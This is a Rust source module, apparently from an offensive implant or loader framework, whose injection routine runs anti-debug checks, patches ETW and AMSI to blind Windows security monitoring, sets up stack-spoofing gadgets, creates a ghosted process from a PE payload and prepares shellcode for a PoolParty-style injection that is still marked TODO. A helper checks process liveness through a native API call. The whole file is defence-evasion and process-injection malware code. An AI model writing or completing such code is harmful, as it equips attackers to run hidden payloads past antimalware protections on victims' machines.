pub mod ghosting;
pub mod poolparty;

use crate::debug;
use crate::core::{amsi, etw, spoof, nt, types::*};
use core::ffi::c_void;

pub unsafe fn execute(config: ghosting::Config) -> bool { unsafe {
    debug!("[INJECTION] Environment hardening");
    
    if !crate::core::anti_debug::is_safe_environment() { return false; }

    etw::patch_etw();
    amsi::patch_amsi();

    if config.enable_stack_spoof {
        spoof::initialize_spoof_gadgets();
    }

    if !config.enable_ghosting || config.pe_payload.is_empty() { return false; } 

    let mut state = match ghosting::ghost_process(&config) {
        Some(s) => s,
        None => {
            debug!("[ABORT] Ghosting failed, no host to inject into");
            return false;
        }
    };
    debug!("[*1] Host process ready: PID {} handle {:p}", state.process_id, state.process_handle);

    if !is_process_alive(state.process_handle) {
        debug!("[ABORT] Ghost process died before injection");
        state.rollback();
        return false;
    }

    if config.shellcode.is_empty() {
        debug!("[ABORT] No shellcode to inject");
        state.rollback();
        return false;
    }

    // TODO: PoolParty injection
    true    
}}



/**
 * Check if a process is till alive by doing a zero timeout wait on its handle
 * STATUS_TIMEOUT (0x102) = alive, STATUS_WAIT_0 (0x0) = exited.
 * */
#[cfg(target_arch = "x86_64")]
pub unsafe fn is_process_alive(process_handle: HANDLE) -> bool { unsafe {
    if process_handle.is_null() {
        return false;
    }
    let mut zero_timeout: i64 = 0; // instant check
    let status = nt::nt_wait_for_single_object(
        process_handle, 
        0u8, 
        &mut zero_timeout as *mut _ as *mut c_void
    );
    // STATE_TIMEOUT means process still running
    status == 0x00000102u32 as i32
}}